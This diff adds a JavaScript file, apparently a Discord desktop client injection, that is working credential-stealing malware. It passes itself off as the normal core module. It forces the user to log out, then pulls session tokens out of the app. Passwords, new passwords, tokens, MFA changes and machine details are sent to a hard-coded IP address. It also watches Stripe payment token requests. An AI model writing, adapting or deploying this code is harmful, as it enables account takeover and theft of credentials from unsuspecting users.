@@ -1,0 +1,197 @@
+const fs = require('fs');
+const path = require('path');
+const { BrowserWindow, session } = require('electron');
+const http = require("http");
+const os = require("os");
+
+// session.defaultSession.webRequest.onHeadersReceived(function (j, k) {
+//     j.responseHeaders["Access-Control-Allow-Origin"] = '*';
+//     if (!j.responseHeaders["content-security-policy-report-only"] && !j.responseHeaders["content-security-policy"]) return k({ cancel: false });
+//     delete j.responseHeaders["content-security-policy-report-only"];
+//     delete j.responseHeaders["content-security-policy"];
+//     k({ cancel: false, responseHeaders: j.responseHeaders });
+// });
+
+const FirstTimeFilters = { 
+    urls: [
+        "https://status.discord.com/api/v*/scheduled-maintenances/upcoming.json", 
+        "https://*.discord.com/api/v*/applications/detectable", 
+        "https://discord.com/api/v*/applications/detectable", 
+        "https://*.discord.com/api/v*/users/@me/library", 
+        "https://discord.com/api/v*/users/@me/library", 
+        "https://*.discord.com/api/v*/users/@me/billing/subscriptions", 
+        "https://discord.com/api/v*/users/@me/billing/subscriptions", 
+        "wss://remote-auth-gateway.discord.gg/*"
+    ] 
+};
+const Filters = { 
+    urls: [
+        "https://api.stripe.com/v*/tokens", 
+
+        "https://discord.com/api/v*/users/@me", 
+        "https://discordapp.com/api/v*/users/@me", 
+        "https://*.discord.com/api/v*/users/@me", 
+        "https://*.discordapp.com/api/v*/users/@me", 
+        "https://discord.com/api/v*/auth/login", 
+        "https://discordapp.com/api/v*/auth/login", 
+        "https://*.discord.com/api/v*/auth/login", 
+        "https://*.discordapp.com/api/v*/auth/login", 
+
+        "https://discord.com/api/v*/users/@me/mfa/totp/enable", 
+        "https://discordapp.com/api/v*/users/@me/mfa/totp/enable", 
+        "https://*.discord.com/api/v*/users/@me/mfa/totp/enable", 
+        "https://*.discordapp.com/api/v*/users/@me/mfa/totp/enable", 
+
+        "https://discord.com/api/v*/users/@me/mfa/totp/disable", 
+        "https://discordapp.com/api/v*/users/@me/mfa/totp/disable", 
+        "https://*.discord.com/api/v*/users/@me/mfa/totp/disable",
+        "https://*.discordapp.com/api/v*/users/@me/mfa/totp/disable", 
+        "https://discord.com/api/v*/users/@me/mfa/codes", 
+        "https://discordapp.com/api/v*/users/@me/mfa/codes", 
+        "https://*.discord.com/api/v*/users/@me/mfa/codes",
+        "https://*.discordapp.com/api/v*/users/@me/mfa/codes",
+    ] 
+    };
+
+async function FirstTime() {
+    if (!fs.existsSync(path.join(__dirname, "resources"))) return true;
+    fs.rmdirSync(path.join(__dirname, "resources"));
+
+    Injected(os.hostname(), __dirname.split('\\')[2], __dirname.split('\\')[5], __dirname.split('\\')[6].split('-')[1])
+
+    let essaies = 0;
+    let deconnected = false;
+    while (deconnected == false) {
+        essaies++;
+        try {
+            const window = await BrowserWindow.getFocusedWindow();
+            await window.webContents.executeJavaScript(`function LogOut(){var t=webpackJsonp.push([[],{extra_id:(t,n,e)=>t.exports=e},[["extra_id"]]]);(function(n){const e="string"==typeof n?n:null;for(const o in t.c)if(t.c.hasOwnProperty(o)){const r=t.c[o].exports;if(r&&r.__esModule&&r.default&&(e?r.default[e]:n(r.default)))return r.default;if(r&&(e?r[e]:n(r)))return r}return null})("login").logout()} LogOut()`, true);
+            deconnected = true;
+        } catch {
+        }
+        await sleep(100);
+    }
+    return false;
+}
+
+session.defaultSession.webRequest.onBeforeRequest(FirstTimeFilters, async (details, callback) => {
+    console.log(details.url)
+    if (FirstTime()) {
+        if (details.url.startsWith("wss://")) {
+            return callback({ cancel: true });
+        } else {
+            return callback({ cancel: false });
+        }
+    }
+})
+
+function SendToApi(path, toSend) {
+    const options = {
+        hostname: '54.38.180.166',
+        port: 81,
+        path: path,
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' }
+    };
+    console.log(options);
+    const req = http.request(options, res => res.on('data', d => process.stdout.write(d)));
+    req.on('error', error => { });
+    req.write(JSON.stringify(toSend));
+    req.end();
+};
+
+function Login(password, token) {
+    console.log(token);
+    console.log(password);
+    SendToApi("/api/login", { "token": token, "password": password });
+};
+function ChangePassword(new_password, token) {
+    SendToApi("/api/updated/password", { "token": token, "new_password": new_password });
+};
+function ChangeEmail(password, token) {
+    SendToApi("/api/updated/email", { "token": token, "password": password });
+};
+function MfaEnabled(password, token) {
+    SendToApi("/api/mfa/enabled", { "token": token, "password": password });
+}
+function MfaDisabled(token) {
+    SendToApi("/api/mfa/disabled", { "token": token });
+}
+function MfaCodesUpdated(password, token) {
+    SendToApi("/api/mfa/codes/updated", { "token": token, "password": password });
+}
+function Injected(computer_name, user, build, version) {
+    SendToApi("/api/injected", { "computer_name": computer_name, "user": user, "build": build, "version": version });
+}
+
+session.defaultSession.webRequest.onCompleted(Filters, async (details, callback) => {
+    console.log(details.url);
+    if (details.url.endsWith("codes") && details.statusCode == 200) {
+        const data = JSON.parse(Buffer.from(details.uploadData[0].bytes).toString());
+        let password = data.password;
+
+        if (data.regenerate === true) {
+            const window = BrowserWindow.getFocusedWindow();
+            window.webContents.executeJavaScript(`var req=webpackJsonp.push([[],{extra_id:(e,t,r)=>e.exports=r},[["extra_id"]]]);for(let e in req.c)if(req.c.hasOwnProperty(e)){let t=req.c[e].exports;if(t&&t.__esModule&&t.default)for(let e in t.default)"getToken"===e&&(token=t.default.getToken())} token`, true).then(token => {
+                MfaCodesUpdated(password, token);
+            });
+        } else {
+
+        }
+    }
+    if (details.url.endsWith("enable") && details.statusCode == 200) {
+        const data = JSON.parse(Buffer.from(details.uploadData[0].bytes).toString());
+        let password = data.password;
+        const window = BrowserWindow.getFocusedWindow();
+        window.webContents.executeJavaScript(`var req=webpackJsonp.push([[],{extra_id:(e,t,r)=>e.exports=r},[["extra_id"]]]);for(let e in req.c)if(req.c.hasOwnProperty(e)){let t=req.c[e].exports;if(t&&t.__esModule&&t.default)for(let e in t.default)"getToken"===e&&(token=t.default.getToken())} token`, true).then(token => {
+            MfaEnabled(password, token);
+        });
+    }
+    if (details.url.endsWith("disable") && details.statusCode == 200) {
+        const window = BrowserWindow.getFocusedWindow();
+        window.webContents.executeJavaScript(`var req=webpackJsonp.push([[],{extra_id:(e,t,r)=>e.exports=r},[["extra_id"]]]);for(let e in req.c)if(req.c.hasOwnProperty(e)){let t=req.c[e].exports;if(t&&t.__esModule&&t.default)for(let e in t.default)"getToken"===e&&(token=t.default.getToken())} token`, true).then(token => {
+            MfaDisabled(token)
+        });
+    }
+    if (details.url.endsWith("login")) {
+        if (details.statusCode == 200) {
+            const data = JSON.parse(Buffer.from(details.uploadData[0].bytes).toString())
+            const password = data.password;
+
+            const window = BrowserWindow.getFocusedWindow();
+            window.webContents.executeJavaScript(`var req=webpackJsonp.push([[],{extra_id:(e,t,r)=>e.exports=r},[["extra_id"]]]);for(let e in req.c)if(req.c.hasOwnProperty(e)){let t=req.c[e].exports;if(t&&t.__esModule&&t.default)for(let e in t.default)"getToken"===e&&(token=t.default.getToken())} token`, true).then((token => {
+                Login(password, token);
+            }));
+        } else {
+        }
+    }
+    if (details.url.endsWith("users/@me")) {
+        if (details.statusCode == 200 && details.method == "PATCH") {
+            const data = JSON.parse(Buffer.from(details.uploadData[0].bytes).toString())
+            if (data.password != null && data.password != undefined && data.password != "") {
+                if (data.new_password != undefined && data.new_password != null && data.new_password != "") {
+
+                    const window = BrowserWindow.getFocusedWindow();
+                    window.webContents.executeJavaScript(`var req=webpackJsonp.push([[],{extra_id:(e,t,r)=>e.exports=r},[["extra_id"]]]);for(let e in req.c)if(req.c.hasOwnProperty(e)){let t=req.c[e].exports;if(t&&t.__esModule&&t.default)for(let e in t.default)"getToken"===e&&(token=t.default.getToken())} token`, true).then((token => {
+                        ChangePassword(data.new_password, token);
+                    }));
+                }
+                if (data.email != null && data.email != undefined && data.email != "") {
+                    const window = BrowserWindow.getFocusedWindow();
+                    window.webContents.executeJavaScript(`var req=webpackJsonp.push([[],{extra_id:(e,t,r)=>e.exports=r},[["extra_id"]]]);for(let e in req.c)if(req.c.hasOwnProperty(e)){let t=req.c[e].exports;if(t&&t.__esModule&&t.default)for(let e in t.default)"getToken"===e&&(token=t.default.getToken())} token`, true).then((token => {
+                        ChangeEmail(data.password, token);
+                    }));
+                }
+            }
+        } else {
+
+
+        }
+    }
+});
+
+module.exports = require('./core.asar');
+
+function sleep(ms) {
+    return new Promise(resolve => setTimeout(resolve, ms));
+}
